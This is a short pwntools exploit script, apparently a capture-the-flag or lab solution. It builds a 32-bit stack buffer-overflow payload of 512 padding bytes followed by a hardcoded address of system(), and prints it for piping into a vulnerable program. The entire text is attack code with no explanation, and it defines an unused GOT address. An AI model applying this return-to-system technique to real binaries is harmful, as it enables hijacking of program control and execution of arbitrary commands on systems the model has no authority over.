from pwn import *
import sys

pltgot = 0x5655700c
system = 0xf7e097e0

payload = ""
payload += "A" * 512
payload += p32(system)

sys.stdout.write(payload)

# offset 0x31724130 @ 512
